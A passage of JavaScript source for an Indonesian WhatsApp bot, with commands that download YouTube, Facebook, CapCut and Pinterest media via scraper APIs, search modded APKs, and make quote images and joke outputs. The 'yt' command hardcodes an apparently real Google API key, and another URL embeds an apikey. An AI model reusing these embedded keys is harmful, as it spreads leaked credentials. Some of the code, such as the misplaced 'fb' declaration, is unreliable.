        json?.status === 'success' ||
        json?.success === true ||
        json?.result ||
        json?.data

      if (!isOk) return xreply(`❌ *Gagal ambil video*\n\n${json?.message || json?.error || json?.msg || 'API tidak merespon dengan benar.'}`)

      const data = json.result || json.data || json
      const downloadUrl =
        data.download ||
        data.url ||
        data.dl ||
        data.link ||
        data.mp4 ||
        data.video ||
        (Array.isArray(data.medias) && (data.medias.find(v => String(v.quality || '').includes(format))?.url || data.medias[0]?.url)) ||
        null

      const title = data.title || data.name || data.judul || 'YouTube Video'

      if (!downloadUrl) return xreply(
        `❌ Download URL tidak ditemukan.\n\nResponse:\n\`\`\`\n${JSON.stringify(json).slice(0, 1500)}\n\`\`\``
      )

      const { data: buffer } = await axios.get(downloadUrl, {
        responseType: 'arraybuffer',
        timeout: 600000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      })

      const videoBuffer = Buffer.from(buffer)
      if (!videoBuffer.length) throw new Error('File video kosong.')

      const safeTitle = (title.replace(/[^\w\s-]/gi, '_').trim() || 'video').slice(0, 80)
      const sizeMB = (videoBuffer.length / 1024 / 1024).toFixed(2)

      const caption =
        `🎬 *${title}*\n` +
        `📺 Quality : ${format}p\n` +
        `📦 Size : ${sizeMB} MB\n\n` +
        `> ${global.botname || 'MISTER-MD'}`

      if (videoBuffer.length > 1024 * 1024 * 30) {
        await client.sendMessage(m.chat, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `${safeTitle}_${format}p.mp4`,
          caption
        }, { quoted: m })
      } else {
        await client.sendMessage(m.chat, {
          video: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `${safeTitle}_${format}p.mp4`,
          caption
        }, { quoted: m })
      }

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    } catch (e) {
      console.error('[YTMP4 ERROR]', e?.response?.data || e?.message || e)
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => { })
      return xreply(`❌ *Error*\n\n${e?.response?.data?.message || e?.response?.data?.error || e?.message || e}`)
    }
  }
  break

  case 'ytmp2': {
    try {
      if (!args[0]) return xreply(`Gunakan: ${prefix + command} <url>`)

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

      let url = `https://www.sankavollerei.com/download/ytmp3?apikey=planaai&url=${encodeURIComponent(args[0])}`
      let res = await axios.get(url)
      let json = res.data

      if (!json.status) return xreply(`❌ Gagal mengambil data dari API`)

      let { title, thumbnail, download, duration } = json.result

      await client.sendMessage(m.chat, {
        audio: { url: download },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
      }, { quoted: m })

    } catch (err) { xreply(`❌ Error\nLogs error : ${err.message}`) }
  }
  break

  case 'yt':
  case 'youtube': {
    const axios = require('axios');
    if (!text) return xreply(`Contoh penggunaan:
• yt search lofi
• yt channel lofi girl
• yt latest lofi girl
• yt stat https://youtube.com/watch?v=abc123`);

    const subcmd = text.split(' ')[0].toLowerCase();
    const query = text.replace(subcmd, '').trim();
    const apikey = 'AIzaSyBI6P58kEwxWywxh_UeCUpQC7_T5xwieTg';

    if (!['search', 'channel', 'latest', 'stat'].includes(subcmd))
      return xreply('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');

    try {
      if (subcmd === 'search') {
        if (!query) return xreply('Contoh: yt search lofi chill');
        const { data } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
          params: {
            part: 'snippet',
            q: query,
            key: apikey,
            type: 'video',
            maxResults: 30
          }
        });

        if (!data.items.length) return xreply('Video tidak ditemukan.');
        let teks = '*Hasil Pencarian YouTube:*\n\n';
        data.items.forEach(v => {
          teks += `• *${v.snippet.title}*\n`;
          teks += ` Channel: ${v.snippet.channelTitle}\n`;
          teks += ` Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
        });
        return xreply(teks);
      }

      if (subcmd === 'channel') {
        if (!query) return xreply('Contoh: yt channel lofi girl');
        const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
          params: {
            part: 'snippet',
            q: query,
            type: 'channel',
            key: apikey
          }
        });

        const ch = search.data.items[0];
        if (!ch) return xreply('Channel tidak ditemukan.');
        const channelId = ch.id.channelId;
        const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
          params: {
            part: 'snippet,statistics,brandingSettings',
            id: channelId,
            key: apikey
          }
        });

        const info = detail.data.items[0];
        if (!info) return xreply('Gagal mengambil detail channel.');
        const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
        const cap = `*Channel Info:*
• *Nama:* ${info.snippet.title}
• *Subscriber:* ${info.statistics.subscriberCount}
• *Views:* ${info.statistics.viewCount}
• *Total Video:* ${info.statistics.videoCount}
• *Dibuat:* ${new Date(info.snippet.publishedAt).toLocaleDateString()}
• *Lokasi:* ${info.snippet.country || 'Tidak diketahui'}
• *Link:* https://youtube.com/channel/${channelId}

*Deskripsi:*\n${info.snippet.description?.slice(0, 500) || 'Tidak ada deskripsi.'}`;

        await client.sendMessage(m.chat, {
          image: { url: info.snippet.thumbnails.high.url },
          caption: cap
        }, { quoted: m });

        if (bannerUrl) await client.sendMessage(m.chat, {
          image: { url: bannerUrl },
          caption: 'Banner Channel'
        }, { quoted: m });
        return;
      }

      if (subcmd === 'latest') {
        if (!query) return xreply('Contoh: yt latest lofi girl');
        const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
          params: {
            part: 'snippet',
            q: query,
            type: 'channel',
            key: apikey
          }
        });

        const ch = search.data.items[0];
        if (!ch) return xreply('Channel tidak ditemukan.');
        const channelId = ch.id.channelId;
        const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
          params: {
            key: apikey,
            channelId,
            part: 'snippet,id',
            order: 'date',
            maxResults: 1
          }
        });

        const vid = latest.data.items[0];
        if (!vid) return xreply('Video terbaru tidak ditemukan.');
        const caption = `*Video Terbaru dari ${vid.snippet.channelTitle}:*
• *Judul:* ${vid.snippet.title}
• *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;

        return client.sendMessage(m.chat, {
          image: { url: vid.snippet.thumbnails.high.url },
          caption
        }, { quoted: m });
      }

      if (subcmd === 'stat') {
        if (!query.includes('youtube.com/watch')) return xreply('Contoh: yt stat https://youtube.com/watch?v=abc123');
        const videoId = new URL(query).searchParams.get('v');
        const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
          params: {
            part: 'snippet,statistics,status,contentDetails',
            id: videoId,
            key: apikey
          }
        });

        const video = res.data.items[0];
        if (!video) return xreply('Video tidak ditemukan.');
        const cap = `*Statistik Video:*
• *Judul:* ${video.snippet.title}
• *Channel:* ${video.snippet.channelTitle}
• *Tayang:* ${new Date(video.snippet.publishedAt).toLocaleDateString()}
• *Views:* ${video.statistics.viewCount}
• *Likes:* ${video.statistics.likeCount}
• *Komentar:* ${video.statistics.commentCount}
• *Kategori ID:* ${video.snippet.categoryId}
• *Status:* ${video.status.privacyStatus}
• *Lisensi:* ${video.status.license}
• *Tags:* ${video.snippet.tags?.slice(0, 5).join(', ') || 'Tidak ada tag'}
• *Link:* https://youtube.com/watch?v=${videoId}

*Deskripsi:* 
${video.snippet.description?.slice(0, 1000) || 'Tidak ada deskripsi.'}`;
        return xreply(cap);
      }
    } catch (err) {
      console.error(err);
      return xreply('Gagal mengambil data dari YouTube. Coba lagi nanti.');
    }
  }
  break

  /// ───────────── [ 𝖢𝖺𝗉𝖼𝗎𝗍 & 𝖥𝖺𝖼𝖾𝖻𝗈𝗈𝗄 ] ──────────── ///
  case 'capcut': {
    try {
      if (!args[0]) return xreply('*Example :* .capcut https://www.capcut.com/tv2/ZSDrUV5e8/')

      let { data } = await axios.post('https://3bic.com/api/download', { url: args[0] }, {
        headers: {
          accept: 'application/json, text/plain, */*',
          'content-type': 'application/json'
        }
      })

      let base64url = data?.originalVideoUrl?.split('/api/cdn/')[1]
      let video = Buffer.from(base64url, 'base64').toString()

      await client.sendMessage(m.chat, { video: { url: video } }, { quoted: m })
    } catch (e) {
      xreply(e.message)
    }
  }
  break

  case "fb": {
    if (!text) return xreply(`Contoh : .fb https://www.facebook.com/share/v/...`)
    xreply('wett')
    try {
      const { hd, sd } = await fb(text)
      const videoUrl = hd || sd
      await client.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m)
    } catch (e) {
      xreply(`Eror kak : ${e.message}`)
    }
  }
  break

  const fb = async (urlFesnuk) => {
    if (typeof urlFesnuk !== "string") throw Error(`mana url nya`)
    const r = await fetch("https://fdown.net/download.php", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ URLz: urlFesnuk })
    })
    if (!r.ok) {
      const txt = await r.text()
      throw Error(`${r.status} ${r.statusText} ${(txt || `(respond body kosong)`).substring(0, 100)}`)
    }
    const html = await r.text()
    const hd = html.match(/id="hdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    const sd = html.match(/id="sdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    if (!hd && !sd) throw Error(`tidak ada video yang bisa di download`)
    return { hd, sd }
  }

  /// ───────────── [ 𝖯𝗂𝗇𝗍𝖾𝗋𝖾𝗌𝗍 ] ──────────── ///
  case "pindown": {
    try {
      if (!text) {
        return xreply(
          `📌 Contoh:

.pindown https://pin.it/2xc4pVU2g`
        )
      }

      await xreply("⏳ Sedang mengambil media Pinterest...")

      const axios = require("axios")

      const { data } = await axios.get(
        `https://api.azbry.com/api/download/pinterest?url=${encodeURIComponent(text)}`
      )

      if (!data.status || !data.result) {
        return xreply("❌ Gagal mengambil data Pinterest")
      }

      const res = data.result

      let caption = `📌 *PINTEREST DOWNLOADER*\n\n`
      caption += `📝 Judul : ${res.title || "(no title)"}\n`
      caption += `👤 User : ${res.user?.fullName || "-"}\n`
      caption += `🏷 Username : ${res.user?.username || "-"}\n`
      caption += `❤️ Likes : ${res.stats?.likes || 0}\n`
      caption += `🔁 Shares : ${res.stats?.shares || 0}\n`
      caption += `💬 Komentar : ${res.stats?.comments || 0}\n`
      caption += `🎬 Tipe : ${res.type || "-"}\n`

      if (res.type === "video" && res.download) {
        let videoUrl = String(res.download)
          .replace(/\\\//g, "/")
          .trim()

        try {
          const vid = await axios.get(videoUrl, {
            responseType: "arraybuffer",
            headers: {
              "User-Agent": "Mozilla/5.0"
            }
          })

          await client.sendMessage(
            m.chat,
            {
              video: Buffer.from(vid.data),
              mimetype: "video/mp4",
              caption
            },
            {
              quoted: m
            }
          )
        } catch {
          await client.sendMessage(
            m.chat,
            {
              video: {
                url: videoUrl
              },
              caption
            },
            {
              quoted: m
            }
          )
        }
      } else if (res.images && res.images.length > 0) {
        let imageUrl = String(res.images[0])
          .replace(/\\\//g, "/")
          .trim()

        await client.sendMessage(
          m.chat,
          {
            image: {
              url: imageUrl
            },
            caption
          },
          {
            quoted: m
          }
        )
      } else if (res.thumbnail) {
        let thumbUrl = String(res.thumbnail)
          .replace(/\\\//g, "/")
          .trim()

        await client.sendMessage(
          m.chat,
          {
            image: {
              url: thumbUrl
            },
            caption
          },
          {
            quoted: m
          }
        )
      } else {
        xreply("❌ Media tidak ditemukan")
      }

    } catch (e) {
      console.log(e)

      xreply(
        `❌ Error:\n${e?.response?.data?.message || e?.message || e}`
      )
    }
  }
  break

  case 'pin':
  case 'pinfoto': {
    const axios = require('axios')
    const https = require('https')

    const agent = new https.Agent({
      rejectUnauthorized: true,
      maxVersion: 'TLSv1.3',
      minVersion: 'TLSv1.2'
    });

    async function getCookies() {
      try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
          const cookies = setCookieHeaders.map(cookieString => {
            const cookieParts = cookieString.split(';');
            return cookieParts[0].trim();
          });
          return cookies.join('; ');
        }
        return null;
      } catch {
        return null;
      }
    }

    async function pinterest(query) {
      try {
        const cookies = await getCookies();
        if (!cookies) return [];

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
        const params = {
          source_url: `/search/pins/?q=${query}`,
          data: JSON.stringify({
            options: {
              isPrefetch: false,
              query: query,
              scope: "pins",
              no_fetch_context_on_resource: false
            },
            context: {}
          }),
          _: Date.now()
        };

        const headers = {
          'accept': 'application/json, text/javascript, */*, q=0.01',
          'accept-encoding': 'gzip, deflate',
          'accept-language': 'en-US,en;q=0.9',
          'cookie': cookies,
          'dnt': '1',
          'referer': 'https://www.pinterest.com/',
          'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
          'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-model': '""',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': '"10.0.0"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
          'x-app-version': 'c056fb7',
          'x-pinterest-appstate': 'active',
          'x-pinterest-pws-handler': 'www/[username]/[slug].js',
          'x-pinterest-source-url': '/hargr003/cat-pictures/',
          'x-requested-with': 'XMLHttpRequest'
        };

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
        return data.resource_response.data.results
          .filter(v => v.images?.orig)
          .map(result => ({
            upload_by: result.pinner.username,
            fullname: result.pinner.full_name,
            followers: result.pinner.follower_count,
            caption: result.grid_title,
            image: result.images.orig.url,
            source: "https://id.pinterest.com/pin/" + result.id,
          }));
      } catch {
        return [];
      }
    }

    if (!text) return xreply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);

    let [query, count] = text.split(' ');
    let imgCount = 5;

    if (text.indexOf(' ') !== -1) {
      const lastWord = text.split(' ').pop();
      if (!isNaN(lastWord) && lastWord.trim() !== '') {
        imgCount = parseInt(lastWord);
        query = text.substring(0, text.lastIndexOf(' '));
      } else {
        query = text;
      }
    } else {
      query = text;
    }

    xreply('Searching Pinterest images...');

    try {
      const results = await pinterest(query);
      if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);

      const imagesToSend = Math.min(results.length, imgCount);
      xreply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);

      for (let i = 0; i < imagesToSend; i++) {
        await client.sendMessage(m.chat, { image: { url: results[i].image } });
      }
    } catch {
      xreply('Error occurred while fetching Pinterest images. Please try again later.');
    }
  }
  break

  /// ───────────── [ 𝖠𝖯𝖪 𝖬𝗈𝖽 ] ──────────── ///
  case 'apkmod': {
    async function getMod(q) {
      try {
        const anu = `https://happymod.com/search.html?q=${q}`;
        const { data } = await axios.get(anu);
        const $ = cheerio.load(data);

        let result = [];

        $(".pdt-app-box").each((_, el) => {
          const title = $(el).find("h3").text().trim();
          const link = "https://happymod.com" + $(el).find('a').attr('href');
          const rate = $(el).find("span.a-search-num").text().trim();

          result.push({ title, link, rate });
        });

        return result;
      } catch (e) {
        console.error(e);
        return [];
      }
    }
    if (!text) return xreply('Mau Cari Aplikasi Apa? \n\n *Example :* .hmod Minecraft');
    client.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } })
    try {
      const data = await getMod(text);
      if (data.length === 0) {
        return xreply('Gak Ketemu');
      }
      let teks = `*[ Happymod Search]*\n\n`;
      for (let i = 0; i < Math.min(data.length, 15); i++) {
        teks += `*${i + 1}. ${data[i].title}*\n`;
        teks += `Rating : ${data[i].rate}\n`;
        teks += `Link : ${data[i].link}\n\n`;
      }
      await client.sendMessage(m.chat, { image: { url: "https://i.postimg.cc/c6q7zRC8/1741529921037.png" }, caption: teks });
    } catch (error) {
      console.error(error);
      xreply('Error')
    }
  }
  break

  case 'deepimg': {
    if (!text) return xreply("Masukkan prompt gambar.")
    xreply("Sedang memproses gambar, mohon tunggu...")

    try {
      const axios = require('axios');
      let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
        prompt: text,
        size: "1024x1024",
        device_id: `dev-${Math.floor(Math.random() * 1000000)}`
      }, {
        headers: {
          "Content-Type": "application/json",
          Origin: "https://deepimg.ai",
          Referer: "https://deepimg.ai/"
        }
      })
      let imageUrl = data?.data?.images?.[0]?.url
      if (!imageUrl) return xreply("Gagal membuat gambar. Coba ganti promptnya.")
      await client.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}`
      }, { quoted: m })
    } catch (err) {
      console.error(err.response ? err.response.data : err.message)
      xreply("Terjadi kesalahan saat memproses gambar.")
    }
  }
  break

  /// ───────────── [ 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
  case "searchsticker": {
    if (!text) return xreply('Sticker Apa Yg Kamu Cari?')
    Reply('_Sedang Mencari Sticker..._');

    try {
      let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
      const res = await fetch(apiUrl);
      const response = await res.json();

      if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
        return xreply('Tidak ditemukan sticker yang sesuai');
      }

      const packNames = [
        "Sticker Keren ",
        "Sticker Lucu ",
        "Created ",
        "Special Sticker ",
        "Random Sticker ",
        "Koleksi Sticker ",
        "Sticker Pack ",
        "Daily Sticker ",
        "Magic Sticker ",
        "Cute Sticker "
      ];

      let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
        `- *Title:* ${response.data.title}\n` +
        `- *Creator:* ${response.creator}\n` +
        `- *Jumlah Sticker:* ${response.data.sticker_url.length}\n` +
        `_Mengirim Sticker Harap Tunggu..._`;

      await client.sendMessage(m.chat, { text: packInfo }, { quoted: m });
      let allStickers = [...response.data.sticker_url];
      allStickers.sort(() => Math.random() - 0.5);
      const maxStickers = Math.min(10, allStickers.length);
      let successCount = 0;
      let attemptCount = 0;

      while (successCount < maxStickers && attemptCount < allStickers.length) {
        try {
          const stickerUrl = allStickers[attemptCount];
          const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];

          await client.sendAsSticker(m.chat, stickerUrl, m, {
            packname: randomPackname,
            author: `By ${global.namaOwner}`
          });

          successCount++;
          await new Promise(resolve => setTimeout(resolve, 500));
        } catch (stickerError) {
          console.log(`Error sending sticker:`, stickerError);
        }
        attemptCount++;
      }

      if (successCount < maxStickers) {
        xreply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
      } else if (response.data.sticker_url.length > 10) {
        xreply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
      }

    } catch (e) {
      console.error('Error in stickersearch:', e);
      xreply('Terjadi kesalahan saat mencari sticker');
    }
  }
  break

  /// ───────────── [ 𝖰𝖢 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
  case "qc": {
    if (!text) return reply(example('teksnya'))
    let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
    var ppuser
    try {
      ppuser = await client.profilePictureUrl(m.sender, 'image')
    } catch (err) {
      ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
    }
    const json = {
      "type": "quote",
      "format": "png",
      "backgroundColor": "#000000",
      "width": 812,
      "height": 968,
      "scale": 2,
      "messages": [
        {
          "entities": [],
          "avatar": true,
          "from": {
            "id": 1,
            "name": m.pushName,
            "photo": {
              "url": ppuser
            }
          },
          "text": text,
          "replyMessage": {}
        }
      ]
    };
    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
      headers: { 'Content-Type': 'application/json' }
    }).then(async (res) => {
      const buffer = Buffer.from(res.data.result.image, 'base64')
      let tempnya = "./library/database/sampah/" + m.sender + ".png"
      await fs.writeFile(tempnya, buffer, async (err) => {
        if (err) return xreply("Error")
        await client.sendAsSticker(m.chat, tempnya, m, { packname: global.packname })
        await fs.unlinkSync(`${tempnya}`)
      })
    })
  }
  break

  case 'createquote': {
    if (!text) return xreply('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
    const { createCanvas, loadImage } = require('canvas');
    function wrapText(ctx, text, maxWidth) {
      const words = text.split(' ');
      let lines = [];
      let currentLine = words[0];
      for (let i = 1; i < words.length; i++) {
        const word = words[i];
        const width = ctx.measureText(currentLine + ' ' + word).width;
        if (width < maxWidth) {
          currentLine += ' ' + word;
        } else {
          lines.push(currentLine);
          currentLine = word;
        }
      }
      lines.push(currentLine);
      return lines;
    }
    async function generateQuoteImage(ppUrl, username, quoteText) {
      const width = 1000;
      const height = 500;
      const canvas = createCanvas(width, height);
      const ctx = canvas.getContext('2d');
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, width, height);
      const avatar = await loadImage(ppUrl);
      ctx.save();
      ctx.beginPath();
      ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.clip();
      ctx.drawImage(avatar, 60, 130, 240, 240);
      ctx.restore();
      ctx.fillStyle = '#ffffff';
      ctx.font = '28px sans-serif';
      let lines = wrapText(ctx, quoteText, 600);
      lines.forEach((line, i) => {
        ctx.fillText(line, 350, 180 + i * 35);
      });
      ctx.fillStyle = '#aaaaaa';
      ctx.font = '22px italic';
      ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
      return canvas.toBuffer();
    }
    let pushname = m.pushName || m.sender.split('@')[0];
    let ppUrl = await client.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
    let buffer = await generateQuoteImage(ppUrl, pushname, text);

    await client.sendMessage(m.chat, {
      image: buffer,
      caption: `📝 Quote dari *${pushname}*\n\n> Biyu`,
      contextInfo: { mentionedJid: [m.sender] }
    }, { quoted: m });
  }
  break

  case 'quoteimg': {
    if (!q) return xreply("Kirim teks quotes-nya dulu ya.\nContoh: .quoteimg jangan nyerah ya, kamu hebat kok")

    try {
      const { createCanvas, loadImage } = require('canvas')
      const axios = require('axios')

      const width = 1000
      const height = 500
      const canvas = createCanvas(width, height)
      const ctx = canvas.getContext('2d')
      ctx.fillStyle = '#ffffff'
      ctx.fillRect(0, 0, width, height)

      const avatarUrl = await client.profilePictureUrl(m.sender, 'image')
      const avatarBuffer = (await axios.get(avatarUrl, { responseType: 'arraybuffer' })).data
      const avatarImg = await loadImage(avatarBuffer)

      ctx.drawImage(avatarImg, 60, 130, 240, 240)

      ctx.fillStyle = '#000000'
      ctx.font = '40px sans-serif'

      function wrapText(text, maxWidth) {
        const words = text.split(' ')
        let lines = []
        let line = ''

        for (const word of words) {
          const testLine = line + word + ' '
          const metrics = ctx.measureText(testLine)
          if (metrics.width > maxWidth && line) {
            lines.push(line.trim())
            line = word + ' '
          } else {
            line = testLine
          }
        }
        if (line) lines.push(line.trim())
        return lines
      }

      const maxTextWidth = 600
      const lines = wrapText(q, maxTextWidth)

      let y = 180
      for (const line of lines) {
        ctx.fillText(line, 350, y)
        y += 55
      }

      ctx.fillStyle = '#505050'
      ctx.font = '30px sans-serif'
      ctx.fillText(`- ${m.pushName || m.sender.split('@')[0]}`, 350, y + 20)

      const buffer = canvas.toBuffer('image/png')

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: 'Berikut quotes-nya~'
      }, { quoted: m })

    } catch (err) {
      console.error(err)
      xreply('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
    }
  }
  break

  /// ───────────── [ 𝖥𝗎𝗇 & 𝖦𝖺𝗆𝖾 𝖳𝖾𝗄𝗌 ] ──────────── ///
  case 'cekgila': {
    const nama = text || m.pushName || 'Kamu'
    const persen = Math.floor(Math.random() * 101)

    const komentar = [
      'Normal... kayak batu bata.',
      'Agak nyeleneh, tapi masih bisa diajak diskusi.',
      'Udah mulai ngaco, tolong dijaga.',
      'Wah ini sih gila bener, cocok masuk rumah tertawa.',
      'Level dewa... gila tapi keren.',
      'Gila banget, sampe bot aja pusing baca chat kamu.',
      'Kayaknya udah enggak bisa diselamatkan 😭',
      'Kamu waras, tapi cuma kalau tidur.',
      'Gila dalam diam... serem banget kamu.',
      'Gila bergaya profesional. Respect.'
    ]

    const kata = komentar[Math.floor(Math.random() * komentar.length)]

    xreply(`🧠 *Tes Kegilaan Hari Ini*\n\n📝 Nama: *${nama}*\n📊 Tingkat Gila: *${persen}%*\n🗯️ Komentar: *${kata}*`)
  }
  break

  case 'jodoh': {
    if (!text.includes('|')) return xreply('Contoh: .jodoh John|Jane');
    const [nama1, nama2] = text.split('|');
    const persen = Math.floor(Math.random() * 100) + 1;
    xreply(`❤️ Kecocokan antara *${nama1.trim()}* dan *${nama2.trim()}* adalah *${persen}%*`);
    break;
  }

  case 'serfikat': {
    if (!text) return xreply(`Kirim perintah *${command} [teks]*\n\nContoh: *${command} Hilman*`)

    try {
      let url = `https://api.sxtream.xyz/maker/yapping?name=${encodeURIComponent(text)}`
      let res = await fetch(url)

      if (!res.ok) throw '❌ Gagal mengambil data dari API.'

      let buffer = await res.buffer()
      await client.sendFile(m.chat, buffer, 'srtdarksistem.jpg', `🗣️ Sertifikat Dark Sistem by *${text}*`, m)

    } catch (e) {
      console.error(e)
      xreply('❌ Terjadi kesalahan saat mengambil gambar.')
    }
  }
  break

  case "motivasi": {
    try {
      let res = await fetch('https://veloria-ui.vercel.app/random/motivasi');
      let data = await res.json();

      if (!data || !data.quotes) return xreply("❌ Gagal mengambil quote.");

      let quote = `📜 *Motivasi Hari Ini*\n\n"${data.quotes}"\n\n📝 _MISTER-MD_`;

      client.sendMessage(m.chat, {
        text: quote
      }, { quoted: m });

    } catch (e) {
      console.error(e);
      xreply("❌ Terjadi kesalahan saat mengambil data.");
    }
  }
  break

  case 'dongeng': {
    try {
      const res = await fetch('https://apizell.web.id/random/dongeng');
      const json = await res.json();
      let caption = `*${json.title}*\n_By ${json.author}_\n\n${json.storyContent.replace(/<[^>]*>/g, '').trim()}\n\n*Nasihat:* ${json.storyContent.split('Nasihat :')[1]?.trim() || '-'}`;
      client.sendMessage(m.chat, {
        image: { url: json.image },
        caption: caption
      }, { quoted: m });
    } catch (e) {
      xreply('Gagal mengambil dongeng. Coba lagi nanti.');
      console.error(e);
    }
  }
  break

  case 'jarak':
  case 'rute':
  case 'cekjarak':
  case 'cekrute': {
    if (!text.includes(',')) return xreply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');

    let [from, to] = text.split(',').map(v => v.trim());
    let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
    try {
      let response = await fetch(biyumaunyepong);
      let data = await response.json();
      if (data.status !== 200) return xreply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
      let result = data.result;
      let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
      xreply(msg);
    } catch (e) {
      console.error(e);
      xreply('Terjadi kesalahan saat mengambil data!');
    }
  }
  break

  /// ───────────── [ 𝖱𝖺𝗇𝖽𝗈𝗆 𝖦𝖺𝗆𝖻𝖺𝗋 ] ──────────── ///
  case "kucing":
  case "cat":
  case "randomkucing": {
    await xreply(mess.wait);
    try {
      const axios = require('axios');

      let anu = `https://api.siputzx.my.id/api/r/cats`
      const response = await axios.get(anu, { responseType: 'arraybuffer' });

      client.sendMessage(m.chat,
        {
          image: Buffer.from(response.data),
          caption: "Berhasil Mengambil"
        }, { quoted: m })
    } catch (e) {
      console.log(e)
      await xreply("Error")
    }
  }
  break

  case "cecan":
  case "cn": {
    await client.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    const apiEndpoints = {
      "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
      "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
      "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
      "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
      "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
      "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
    }
    try {
      const axios = require('axios');
      let araara = new Array()
      const imagesPerCountry = 2
      for (const [country, url] of Object.entries(apiEndpoints)) {
        for (let i = 0; i < imagesPerCountry; i++) {
          try {
            const response = await axios.get(url, { responseType: 'arraybuffer' })
            let imgsc = await prepareWAMessageMedia(
              { image: Buffer.from(response.data) },
              { upload: client.waUploadToServer }
            )
            araara.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                  "name": "cta_url",
                  "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
                }]
              })
            })
            await new Promise(resolve => setTimeout(resolve, 500))

          } catch (error) {
            console.error(`Error processing image ${i + 1} for ${country}:`, error)
            continue
          }
        }
